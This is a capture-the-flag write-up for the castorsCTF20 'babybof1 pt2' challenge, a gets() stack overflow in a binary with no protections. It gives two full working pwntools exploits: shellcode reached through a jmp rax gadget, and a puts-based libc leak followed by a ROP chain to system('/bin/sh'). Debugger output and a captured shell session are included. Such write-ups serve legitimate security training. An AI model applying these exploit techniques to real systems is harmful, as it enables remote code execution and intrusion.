# castorsCTF20

## babybof1 pt2

> 440
>
> Author: Lunga
>
> You should get a shell now!
>
> obs: Same binary as the babybof1, this is correct.
>
> obs2: ASLR is active on the server.
>
> `nc chals20.cybercastors.com 14425`
>
> [`babybof`](babybof)

Tags: _pwn_ _bof_ _x86-64_ _rop_ _shellcode_


## Summary

`gets` + shellcode.  _Hack like it's [1995](https://youtu.be/i8dh9gDzmz8)._


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No mitigations.  With RWX, assume shellcode.

    
### Decompile with Ghidra

```c
void main(void)

{
  char local_108 [256];
  
  puts("Welcome to the cybercastors Babybof");
  printf("Say your name: ");
  gets(local_108);
  return;
}
```

This was a two-part pwn, the first flag can be obtained by directing execution to `get_flag`.  The second requires getting a shell (you can get both flags with a shell).

For a shell, I tried two different solutions.  The first was to leak libc and then call `system`.  That worked locally, but not remotely.  This CTF was plagued with infrastructure problems, and the pwns had "buffering issues" (see below) that slowly got resolved--AFAIK, the game master only tested one-shot solutions.

From the Ghidra disassembly, `local_108` is `0x108` bytes above the return address:

```
                             undefined __stdcall main(void)
             undefined         AL:1               <RETURN>
             undefined1        Stack[-0x108]:1    local_108
```

Since `gets` is unbounded, just write `0x108` bytes then overwrite the return address with a gadget to jmp/call shell code.


## Exploit

### Solution 1

```python
#!/usr/bin/python3

from pwn import *

#p = process('./babybof')
p = remote('chals20.cybercastors.com', 14425)

binary = ELF('./babybof')
context.update(arch='amd64',os='linux')

jmp_rax = list(binary.search(asm('jmp rax')))[0]
print("jmp rax",hex(jmp_rax))

payload  = asm(shellcraft.sh()).ljust(0x108,b'A')
payload += p64(jmp_rax)

p.sendline(payload)
p.interactive()
```

After initial setup this code searches for `jmp rax` (`call rax` is fine too) within the binary.  Since no PIE, there's no need to leak the base process address.

_Why `jmp rax`?_

From GDB: Set a breakpoint at `ret` (`b *main+62`), run, and input `AAAABBBBCCCCDDDD`, then you'll notice that `$rax` is set to the address of `local_108`:

```
$rax   : 0x00007fffffffe450  →  "AAAABBBBCCCCDDDD"
$rbx   : 0x0
$rcx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffe558  →  0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
$rbp   : 0x0000000000400790  →  <__libc_csu_init+0> push r15
$rsi   : 0x4342424242414141 ("AAABBBBC"?)
$rdi   : 0x00007fffffffe451  →  "AAABBBBCCCCDDDD"
$rip   : 0x000000000040078b  →  <main+62> ret
$r8    : 0x0000000000602681  →  0x0000000000000000
$r9    : 0x00007ffff7fd64c0  →  0x00007ffff7fd64c0  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x0000000000400600  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe630  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
```

The rest of the code builds a payload from the pwntools shellcraft supplied shellcode and then pads that out to `0x108` bytes.

Output:

```
# ./exploit.py
[+] Opening connection to chals20.cybercastors.com on port 14425: Done
[*] '/pwd/datajerk/castorsctf20/babybof1_pt2/babybof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
jmp rax 0x400661
[*] Switching to interactive mode
$ ls
babybof
flag.txt
shell_flag.txt
$ cat flag.txt
castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
$ cat shell_flag.txt
castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
```


### Solution 2

```python
#!/usr/bin/python3

from pwn import *

#p = process('./babybof')
p = remote('localhost', 9999)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#p = remote('chals20.cybercastors.com', 14425)
#libc = ELF('libc-database/db/libc6_2.31-0ubuntu9_amd64.so')

'''
# libc-database/find puts 5a0
http://http.us.debian.org/debian/pool/main/g/glibc/libc6_2.30-4_i386.deb (id libc6_2.30-4_i386)
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
'''

binary = ELF('./babybof')

context.update(arch='amd64')
rop = ROP('babybof')
try:
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
    print("no ROP for you!")
    sys.exit(1)

p.recvuntil('Say your name: ')
payload  = 0x108 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.symbols['main'])
p.sendline(payload)

_ = p.recvline().strip()
_ = p.recvline().strip()
puts = u64(_ + 2*b'\x00')
print('puts:',hex(puts))
baselibc = puts - libc.symbols['puts']
print('baselibc:',hex(baselibc))

p.recvuntil('Say your name: ')
payload  = 0x108 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(baselibc + next(libc.search(b'/bin/sh')))
payload += p64(baselibc + libc.symbols['system'])
p.sendline(payload)

p.interactive()
```

This is normally how I solve many of these problems; usually NX is enabled, and I have so many of these examples laying around it's an easy C&P job.

> See [https://github.com/datajerk/ctf-write-ups/tree/master/tjctf2020/stop](https://github.com/datajerk/ctf-write-ups/tree/master/tjctf2020/stop) for a lengthy description of how the above code works.

> This did not work until much later in the competition when the "buffering issues" were corrected.  Others reported on this as well.


#### Tip: Hosting the binary yourself:

```
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:$PWD/babybof,pty,stderr,setsid,sigint,sane,rawer
```

While I was waiting for the "buffering issues" to be corrected I self-hosted the binary using the above to do the exploit development.  The first part of the exploit did work (the leak), however it was not possible to coordinate the second part until later in the CTF.

> I got tired of waiting, so ended up with the shellcode solution.


#### My $0.02 US

IMHO, the "buffering issue" was a non-issue.  i.e., it was solvable with shellcode without any corrective action.  It was annoying, in that this CTF pwn did not behave like others, but then you just have to find a different solution.  The game masters could have stood their ground, and this isn't the only CTF were I have had this problem (you've seen them to, any where you `nc` to the port and nothing is output, no prompt, nothing.  However, the local binary outputs immediately), while this can make exploit development difficult, it does not make it impossible, just different.

